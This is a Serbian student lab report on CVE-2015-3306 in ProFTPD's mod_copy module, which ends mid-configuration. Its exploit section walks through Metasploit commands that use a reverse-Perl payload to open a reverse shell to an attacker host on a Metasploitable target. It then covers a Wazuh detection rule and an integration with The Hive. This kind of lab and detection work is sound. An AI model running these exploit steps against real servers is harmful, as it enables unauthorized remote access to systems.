# Eksploatacija ranjivosti, detekcija, i Incident Response izveštaj

### Ime i prezime: Ognjen Radovanović R2 9/2024

---

## Pregled ranjivosti

### 1.1 Informacije o ranjivosti

- **ID ranjivosti (CVE):** CVE-2015-3306
- **Pogođen servis:** ProFTPD
- **CVSS ocena:** 9.8
- **Opis ranjivosti:** Ranjivost se odnosi na `mod_copy` modul u ProFTPD verziji 1.3.5, koji omogućava udaljenim napadačima da čitaju i pišu u proizvoljne fajlove korišćenjem FTP komandi `SITE CPFR` i `SITE CPTO`. Ranjivost omogućava neautorizovan pristup fajlovima na sistemu i potencijalno daljinsko preuzimanje kontrole nad pogođenim serverom.

### 1.2 Opis eksploita

**Metod eksploatacije:**

Eksploatacija ranjivosti koristi komandni interfejs Metasploit Framework-a kako bi se iskoristila ranjivost u `mod_copy` modulu. Napad uključuje korišćenje komandi `SITE CPFR` i `SITE CPTO` za premeštanje malicioznog payload-a na serveru.

---

## Proces eksploatacije

### 2.1 Podešavanje eksploita

**Ranjiv cilj:**

- Operativni sistem: Metasploitable 3 Ubuntu
- Verzija ProFTPD-a: 1.3.5
- Portovi: FTP (21), HTTP (80)

**Alati za eksploataciju:**

- Metasploit Framework
- Alat za testiranje mreža (npr. `nmap` za detekciju servisa i verzija)

### 2.2 Koraci eksploatacije

1. **Pokretanje Metasploit Framework-a:**

   ```bash
   msfconsole
   ```
2. **Pronalaženje odgovarajućeg modula:**

   ```bash
   search proftpd
   ```

   Odabiramo modul `exploit/unix/ftp/proftpd_modcopy_exec` za eksploataciju.

   ```bash
   use exploit/unix/ftp/proftpd_modcopy_exec
   ```
3. **Odabiramo payload `cmd/unix/reverse_perl`.**

   ```bash
   use cmd/unix/reverse_perl
   ```
4. **Postavljamo sitepath.**

   ```bash
   set sitepath /var/www/html
   ```
5. **Podešavanje parametara eksploita:**

   - Postavljamo IP adresu cilja:
     ```bash
     set RHOST <CILJ_IP>
     ```
   - Postavljamo port cilja:
     ```bash
     set RPORT 21
     ```
   - Postavljamo IP adresu napadača za reverse shell konekciju:
     ```bash
     set LHOST <NAPADAC_IP>
     ```
   - Postavljamo lokalni port za reverse shell konekciju:
     ```bash
     set LPORT 4444
     ```
6. **Pokretanje eksploita:**

   ```bash
   exploit
   ```
![Screenshot_3](https://github.com/user-attachments/assets/5f26bbd9-6fa5-4e78-a776-2ff978f72447)
![Screenshot_1](https://github.com/user-attachments/assets/ed5f8fa4-e880-4544-a7b8-b94a0a56306b)
![Screenshot_2](https://github.com/user-attachments/assets/4d13c2f8-597c-48ad-91e1-c7038c59d779)

### 2.3 Rezultat eksploatacije

Eksploatacija je uspešno izvršena. Ostvarena je Metasploit Meterpreter sesija na ciljnom sistemu, omogućavajući daljinski pristup fajlovima i sistemskim komandama.

---

## Detekcija korišćenjem Wazuh SIEM-a

### 3.1 Pravila za detekciju

**Dodato pravilo u Wazuh SIEM-u:**

U fajlu `/var/ossec/etc/rules/local_rules.xml` dodat je sledeći unos za detekciju malicioznih `SITE CPFR` i `SITE CPTO` komandi:

```xml
<group name="proftpdgroup">
    <rule id="100003" level="12">
        <description>ProFTPD mod_copy attack detected</description>
        <match>SITE CPFR|SITE CPTO</match>
        <options>no_full_log</options>
        <mitre>
            <id>T1021</id>
        </mitre>
    </rule>
</group>
```

- **ID pravila:** `100003`
- **Mitre ID:** `T1021`
- **Level:** `12`
- **Opis pravila:** Pravilo detektuje FTP komande koje se koriste za eksploataciju `mod_copy` modula.

### 3.2 Konfiguracija SIEM-a

**Postavljanje Wazuh agenta:**

Agent je instaliran na ciljnoj mašini korišćenjem naredbe:

```bash
wget https://packages.wazuh.com/4.x/apt/pool/main/w/wazuh-agent/wazuh-agent_4.9.2-1_amd64.deb
sudo WAZUH_MANAGER='<MANAGER_IP>' WAZUH_AGENT_NAME='<CILJ_IMENA>' dpkg -i ./wazuh-agent_4.9.2-1_amd64.deb
```

Agent se zatim pokreće:

```bash
sudo /var/ossec/bin/wazuh-control start
```

**Prikupljanje logova:**

Dodato je praćenje FTP logova u `ossec.conf` fajlu:

```xml
<localfile>
  <location>/var/log/proftpd/proftpd.log</location>
  <log_format>syslog</log_format>
</localfile>
```

### 3.3 Proces detekcije

Nakon pokretanja eksploita, u logovima se beleže maliciozne komande `SITE CPFR` i `SITE CPTO`, koje su detektovane kao potencijalni napad. Wazuh generiše alarme sa detaljima o izvornoj IP adresi napadača.

---

## Incident Response sa The Hive-om

### 4.1 Podešavanje integracije

**Opis integracije:**

Wazuh je konfigurisan za integraciju sa The Hive-om kako bi svi detektovani incidenti bili automatski prosleđeni. Koristi se Python skripta za komunikaciju sa API-em The Hive-a, koja kreira novi incident za svaki relevantan alarm.

**Dodavanje pravila u integraciju:**

Konfiguracija u Wazuh menadžru za integraciju sa The Hive-om izgleda ovako:

```xml
<integration>
  <name>thehive</name>
  <hook_url>http://<THE_HIVE_IP>:9000/api/alert</hook_url>
  <api_key><API_KEY></api_key>
  <level>10</level>
</integr
```
